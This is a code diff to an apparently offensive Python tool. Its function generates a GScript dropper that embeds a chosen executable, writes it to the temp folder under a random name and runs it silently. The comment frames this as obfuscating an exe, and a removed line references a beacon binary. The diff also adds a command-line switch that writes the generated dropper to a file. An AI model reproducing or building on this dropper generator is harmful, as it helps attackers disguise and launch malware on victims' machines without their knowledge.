@@ -53,8 +53,10 @@ def string_loader(f):
 
 # Autmomatically generate a gscript which obfuscates an exe
 def generate_gscript_exe(exe_path, outfile):
-    gscript = Template('\n// ATT&CK: \n//import:candy.exe\n//go_import:os as os2\n\nfunction Deploy() {  \n var bin = GetAssetAsBytes(\"beaconbenversion.bin\");\nvar temppath = os2.TempDir();\nvar naming = G.rand.GetAlphaString(4);\nnaming = naming.toLowerCase();\nfullpath = temppath+"\\"+naming+".exe";\nerrors = G.file.WriteFileFromBytes(fullpath, bin[0]);\nvar running = G.exec.ExecuteCommandAsync(fullpath, [""]);\nreturn true;\n}')
-    print(gscript)
+    gscript = Template('\n// ATT&CK: \n//import:$import_file \n//go_import:os as os2\n\nfunction Deploy() {\nvar bin = GetAssetAsBytes(\"$import_file\");\nvar temppath = os2.TempDir();\nvar naming = G.rand.GetAlphaString(4);\nnaming = naming.toLowerCase();\nfullpath = temppath+"\\\\"+naming+".exe";\nerrors = G.file.WriteFileFromBytes(fullpath, bin[0]);\nvar running = G.exec.ExecuteCommandAsync(fullpath, [""]);\nreturn true;\n}')
+    script = gscript.safe_substitute(import_file=exe_path)
+    f = open(outfile, "w")
+    f.write(script)
 
 if __name__ == "__main__":
     if len(sys.argv) < 2:
@@ -69,4 +71,5 @@ if __name__ == "__main__":
         else:
             line_breaker(string_loader(sys.argv[2]), sys.argv[3], sys.argv[4])
 
-    
+    if (sys.argv[1] == "-g" and len(sys.argv) > 3):
+        generate_gscript_exe(sys.argv[2], sys.argv[3])
